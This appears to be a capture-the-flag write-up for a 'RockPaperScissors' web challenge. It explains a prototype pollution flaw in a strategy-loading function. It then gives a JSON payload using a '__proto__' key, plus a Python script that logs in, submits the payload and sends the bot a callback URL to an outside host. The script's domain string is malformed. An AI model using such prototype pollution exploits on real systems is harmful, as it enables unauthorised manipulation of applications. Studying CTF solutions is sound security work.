## WriteUp for RockPaperScissors

In ```/game/play-strategy``` page, the bot tests the given strategy and if player wins more than 31337 times the bot send reqeust to callbackUrl.
```javascript
  finishGame() {
    if (this.scores.player - this.scores.computer > 31337) {
      this.scores.didPlayerWin = true;
    }
  }
```

However, it fulfill that condition in normal condition.

There is prototype pollution in ```/public/js/play.js``` to use.
```javascript
function loadStrategy(sgs) {
  for (let sg of sgs) {
    let new_sg = { "move": "", "id": -1, "if": {} };
    for (let key of Object.keys(sg)) {
      if (typeof sg[key] === 'object')
        Object.assign(new_sg[key], sg[key]);
      else
        new_sg[key] = sg[key];
    }
    strategies.push(new_sg);
  }
}
```

```Object.assign``` can affect prototype using ```__proto__``` key such as like this.
```json
{
    "name": "Exploit2",
    "strategy": [
        {
            "move": "rock",
            "id": 0,
            "__proto__": {
                "didPlayerWin": true
            },
            "if": {
                "onWin": {
                    "id": 1,
                    "move": ""
                }
            }
        }
    ]
}
```
So the final exploit would be somthing like belows.
```python
import requests
import json

with requests.session() as sess:
    data = {'username': 'test', 'password': 'test'}
    header = {'Content-Type': 'text/plain;charset=UTF-8'}
    domain = 'http://http://rockpaperscissors.sstf.site:34343'
    r = sess.post(f'{domain}/user/signin',
                  data=json.dumps(data), headers=header)

    pp_exploit = {"name": "Exploit2", "strategy": [{"move": "rock", "id": 0, "__proto__": {"didPlayerWin": True}, "if": {"onWin": {"id": 1, "move": ""}, "onLose": {"id": 2, "move": "paper", "if": {"onWin": {"id": 12, "move": ""}, "onLose": {"id": 13, "move": ""}, "onDraw": {"id": 14, "move": ""}}}, "onDraw": {"id": 3, "move": ""}}}]}
    r = sess.post(f'{domain}/game/strategy',
              data=json.dumps(pp_exploit), headers=header)

    str_id = json.loads(r.text)['_id']
    send_data = {'url': f'/game/play-strategy?strategy_id={str_id}&callbackUrl=https://xxxxxxxxx/'}
    send_to_bot = sess.post(f'{domain}/bot', data=json.dumps(send_data), headers=header)

```